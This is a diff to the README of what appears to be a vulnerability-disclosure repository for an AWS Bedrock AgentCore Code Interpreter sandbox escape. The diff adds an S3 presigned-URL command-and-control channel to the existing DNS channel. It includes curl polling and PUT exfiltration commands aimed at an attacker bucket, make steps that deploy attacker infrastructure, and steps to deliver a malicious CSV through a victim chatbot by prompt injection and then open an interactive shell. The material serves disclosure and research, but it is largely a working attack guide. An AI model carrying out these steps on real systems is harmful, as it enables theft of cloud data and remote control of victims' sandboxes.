@@ -1,4 +1,4 @@
-# AWS Bedrock AgentCore Code Interpreter DNS Exfiltration Vulnerability
+# AWS Bedrock AgentCore Code Interpreter DNS & S3 Exfiltration Vulnerability
 
 **Vulnerability Disclosure**: [HackerOne Report #3323153](https://hackerone.com/bugs?subject=user&report_id=3323153&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=retesting&reported_to_team=&text_query=&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=25&page=1)
 
@@ -10,7 +10,7 @@ AWS Bedrock AgentCore Code Interpreter's "Sandbox" network mode fails to properl
 
 If you're wondering how likely this is to occur in practice, consider that chatbots often execute arbitrary Python code on behalf of the user; if an attacker can influence this code execution (via direct prompt injection or convincing the code interpreter to execute a separate script), the Code Interpreter is arguably functioning as designed. However, the "Sandbox" mode is supposed to be walled off from the internet - and is **not** working as designed due to the DNS query leakage. An attacker can leverage this code execution to exfiltrate data and execute commands outside the sandbox and establish a reverse shell using the protocol demonstrated here. As shown in the proof of concept, this includes the ability to exfiltrate sensitive data, such as exfiltrating data from S3 buckets or DynamoDB tables, as well as execute any AWS API calls permitted by the Code Interpreter's IAM role.
 
-## Technical Details
+## Technical Details (DNS)
 
 ### Attack and Protocol Architecture
 
@@ -67,6 +67,65 @@ Large outputs split into multiple chunks (60 chars max per label):
   Chunk 22: 1.22.22.1256.dGVzLXVzLWVhc3QtMS00NDU1NzA5MjEyOTg-.1.sess_abc123.c2.bt-research-control.com
 ```
 
+## Technical Details (S3)
+
+### Attack and Protocol Architecture
+
+The attack flow works as follows:
+
+1. **Command Delivery**: Operator writes a JSON command object to `sessions/{session_id}/cmd` in their S3 bucket. The payload polls this object via a presigned GET URL (embedded at generation time, 7-day expiry). The command object includes a presigned PUT URL so the payload knows where to upload its response.
+
+2. **Data Exfiltration**: After executing the command, the payload uploads the raw output via `curl` to the presigned PUT URL, writing it to `sessions/{session_id}/out/{seq}` in the attacker's S3 bucket. The operator polls this key directly using their AWS credentials.
+
+3. **Sandbox Bypass**: Despite "no network access" configuration, the sandbox can reach AWS S3 service endpoints over HTTPS (port 443). This is required for S3 access inside the interpreter. The payload exploits this by communicating exclusively with S3 presigned URLs, which are indistinguishable from normal AWS API traffic.
+
+### Command Delivery (Operator → Payload via S3 Presigned GET)
+
+The operator writes a JSON object to `sessions/{session_id}/cmd`. The payload polls it using a presigned GET URL baked in at generation time:
+
+```text
+S3 object: sessions/sess_abc123/cmd
+Contents:  {"seq": 1, "cmd": "whoami", "response_put_url": "https://s3.amazonaws.com/..."}
+            ↑         ↑                 ↑
+            │         │                 └─ Presigned PUT URL for output upload (1-hour expiry)
+            │         └─────────────────── Shell command to execute
+            └───────────────────────────── Sequence number (prevents re-execution on re-poll)
+
+Payload polls via: curl -s "<presigned_get_url>"
+Idle state:        {"seq": 0, "cmd": null}
+```
+
+Sequence numbers prevent re-execution: if `seq <= last_seen_seq`, the payload skips the command.
+
+### Data Exfiltration (Payload → Operator via S3 Presigned PUT)
+
+After executing a command, the payload uploads the raw output using `curl`:
+
+```text
+curl -X PUT --data-binary "<output>" "<response_put_url>"
+                           ↑          ↑
+                           │          └─ Presigned PUT URL from command object (1-hour expiry)
+                           └─────────── Raw command output (no size limit)
+
+Result stored at: s3://{attacker-bucket}/sessions/sess_abc123/out/1
+Operator reads:   poll_for_output(bucket, "sess_abc123", seq=1, timeout=60)
+```
+
+Unlike DNS (60-char label limit), output size is unlimited — entire files can be exfiltrated in a single PUT.
+
+## C2 Channels
+
+This project includes two independent C2 channel implementations, demonstrating that both DNS traffic and arbitrary S3 traffic are permitted in sandboxed code interpreters:
+
+| | DNS Channel (`attacker-infra/`) | S3 Channel (`attacker-infra-s3/`) |
+|---|---|---|
+| **Infrastructure** | EC2 instance running DNS daemon | S3 bucket only (no server) |
+| **Protocol** | DNS A record queries/responses (port 53) | HTTPS presigned URLs (port 443) |
+| **Command encoding** | IP octets encoding base64 chunks | JSON object in S3 |
+| **Output exfiltration** | DNS query subdomains | Direct S3 PUT via presigned URL |
+| **Deployment** | Terraform + EC2 setup | Terraform only |
+| **Output size limit** | ~60 chars per DNS label | Unlimited |
+
 ## Realistic Attack Demo (No Credentials Required)
 
 The demo shows that an attacker with **NO AWS credentials** to the victim's account can exfiltrate sensitive data by uploading a malicious CSV through the victim's public chatbot web UI. The attack flow:
@@ -88,8 +147,13 @@ The demo shows that an attacker with **NO AWS credentials** to the victim's acco
 
 **Terminal 1 - Deploy both infrastructures:**
 ```bash
-# Deploy attacker C2 server
+# Deploy attacker C2 server (DNS channel)
 cd attacker-infra
+export AWS_PROFILE=attacker-account
+make setup && make deploy
+
+# Or deploy S3 C2 channel instead (no EC2 required)
+cd attacker-infra-s3
 export AWS_PROFILE=attacker-account
 make setup && make deploy
 
@@ -102,7 +166,13 @@ make show-url  # Note the chatbot URL
 
 **Terminal 2 - Generate payload and upload via web UI:**
 ```bash
+# DNS channel
 cd attacker-infra
+export AWS_PROFILE=attacker-account
+make generate-csv
+
+# Or S3 channel
+cd attacker-infra-s3
 export AWS_PROFILE=attacker-account
 make generate-csv
 ```
@@ -116,7 +186,12 @@ This creates `malicious_data.csv` and prints a prompt to paste into the chatbot.
 
 **Terminal 3 - Connect to the C2 session:**
 ```bash
+# DNS channel
 cd attacker-infra
+make connect-session
+
+# Or S3 channel
+cd attacker-infra-s3
 make connect-session
 
 # In the operator shell:
@@ -129,7 +204,7 @@ See [docs/DEMO_GUIDE.md](docs/DEMO_GUIDE.md) for detailed step-by-step instructi
 
 ---
 
-## Attacker Infrastructure Setup
+## Attacker Infrastructure Setup (DNS Channel)
 
 ### Prerequisites
 
@@ -287,6 +362,65 @@ You can exit the interactive shell by typing `exit` or pressing `Ctrl+D`. Then, 
 
 ```bash
 make terraform-destroy
+```
+
+---
+
+## Attacker Infrastructure Setup (S3 Channel)
+
+### Prerequisites
+
+- AWS CLI configured
+- Python 3.11+
+- Terraform installed with the latest provider
+- Install [uv](https://docs.astral.sh/uv/getting-started/installation/) for Python dependency management
+
+### Step 0: Deploy C2 Infrastructure
+
+```bash
+cd attacker-infra-s3
+
+# Install dependencies with uv
+make setup
+
+# Deploy S3 bucket (auto-generates .env with S3_C2_BUCKET)
+make deploy
+```
+
+This creates a private S3 bucket (e.g., `agentcore-c2-sessions-<random>`) with server-side encryption and all public access blocked.
+
+### Step 1: Generate and Send Malicious Payload
+
+Generate a malicious CSV with an embedded payload. The payload uses a presigned GET URL (7-day expiry) to poll for commands:
+
+```bash
+make generate-csv
+```
+
+This creates `malicious_data_s3.csv` and saves the session ID to `.session_id`. Upload it via the victim chatbot's web UI (see [docs/DEMO_GUIDE.md](docs/DEMO_GUIDE.md) for the prompt to use), or send it automatically:
+
+```bash
+make exploit  # Reads .victim_url automatically
+```
+
+### Step 2: Connect to the Code Interpreter Session
+
+The session ID is saved to `.session_id` automatically. To open an interactive shell:
+
+```bash
+make connect-session
+```
+
+### Step 3: Verify S3 Exfiltration
+
+Now that you are in the interactive shell, you can verify that S3-based exfiltration is working by executing commands. See [Step 3: Verify DNS Exfiltration](#step-3-verify-dns-exfiltration) for sample commands.
+
+### Step 4: Cleanup
+
+Exit the interactive shell by typing `exit` or pressing `Ctrl+D`. Then destroy the infrastructure:
+
+```bash
+make destroy
 ```
 
 ## Security Impact
